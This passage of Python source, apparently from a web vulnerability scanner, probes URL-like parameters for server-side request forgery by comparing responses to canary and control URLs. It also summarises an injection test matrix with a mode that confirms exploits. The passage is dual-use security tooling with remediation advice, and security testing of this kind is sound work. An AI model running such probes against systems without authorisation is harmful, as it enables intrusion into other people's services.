            r"(?i)(url|uri|link|src|source|target|dest|destination|redirect|redirect_uri|next|callback|"
            r"webhook|image|image_?url|fetch|feed|proxy|load|domain|site|page_?url)", name)
            for name in item.parameters)
    ]
    for item in url_items:
        for parameter in item.parameters[:3]:
            if not context.budget.can_spend(module):
                return findings
            control = send_payload(context, module, item, parameter, "https://example.invalid/recontitan-control")
            for payload_category, payload, payload_description in SSRF_TARGETS:
                probe = send_payload(context, module, item, parameter, payload)
                signal = classify_signal(control, probe, size_delta_ratio=0.15)
                timing_gap = probe.ok and control.ok and abs(probe.elapsed - control.elapsed) > 1.5
                if timing_gap and signal is InjectionSignal.NONE:
                    signal = InjectionSignal.TIMING
                context.record(item, parameter, "ssrf", payload_category, signal, probe)
                if signal is InjectionSignal.NONE:
                    continue
                findings.append(_candidate_finding(
                    module=module,
                    category="danger_ssrf",
                    severity="high",
                    title=f"Server-Side Request Forgery Candidate - {parameter}",
                    description=(
                        f"The parameter '{parameter}' responded differently to a private-range canary URL than to a "
                        "public control URL, which suggests the server dereferences the supplied address itself. "
                        "The scanner did not fetch the canary and did not contact any third-party host."
                    ),
                    item=item, parameter=parameter,
                    payload_category=payload_category, payload_description=payload_description,
                    signal=signal, probe=probe,
                    remediation=(
                        "Resolve and validate destination addresses against an allow-list before fetching, reject "
                        "private, loopback, and link-local ranges, disable redirects, and isolate the fetching "
                        "service from internal networks and metadata endpoints."
                    ),
                    owasp=A10, attack_vector="Server-side request forgery",
                    extra=[
                        ("Control status", control.status),
                        ("Control bytes", control.size),
                        ("Control seconds", round(control.elapsed, 3)),
                    ],
                ))
                break
    return findings


def injection_matrix_finding(context: InjectionContext) -> dict:
    """Summarize every probe sent, including the ones that found nothing."""
    by_type: dict[str, dict[str, int]] = {}
    for entry in context.matrix:
        bucket = by_type.setdefault(entry.injection_type, {"tested": 0, "signals": 0})
        bucket["tested"] += 1
        if entry.signal is not InjectionSignal.NONE:
            bucket["signals"] += 1

    rows = [
        f"{name:<10} probes={counts['tested']:<4} signals={counts['signals']}"
        for name, counts in sorted(by_type.items())
    ]
    endpoints = sorted({entry.endpoint for entry in context.matrix})
    summary = exploitation_summary(context.exploits)
    technique_rows = [f"{name}: {count}" for name, count in sorted(summary["techniques"].items())]
    return danger_finding(
        tool="injection_matrix",
        category="danger_injection_matrix",
        severity="info",
        title=(
            f"Injection Test Matrix - {len(context.matrix)} probe(s), "
            f"{summary['confirmed']} confirmed exploit(s)"
        ),
        description=(
            f"Danger Mode sent {len(context.matrix)} bounded injection probes across {len(endpoints)} endpoint(s) "
            f"and proved exploitation on {summary['confirmed']} of them. Probes with no signal are recorded so "
            "coverage gaps are visible; absence of a signal is not proof the endpoint is safe."
        ),
        evidence=evidence_block([
            ("Total probes", len(context.matrix)),
            ("Endpoints covered", len(endpoints)),
            ("By injection type", "\n" + "\n".join(f"  {row}" for row in rows) if rows else "  none"),
            ("Confirmed exploits", summary["confirmed"]),
            ("Confirmed techniques", "\n" + "\n".join(f"  {row}" for row in technique_rows) if technique_rows else "  none"),
            ("Platforms identified", ", ".join(summary["platforms"]) or "none"),
            ("Requests spent", context.budget.requests_sent),
            ("Payloads spent", context.budget.payloads_sent),
            ("Budget exhausted", "yes" if context.budget.exhausted else "no"),
            ("Data extracted", "none beyond version banners and arithmetic results"),
        ]),
        owasp=A03,
        asset=context.target,
    )
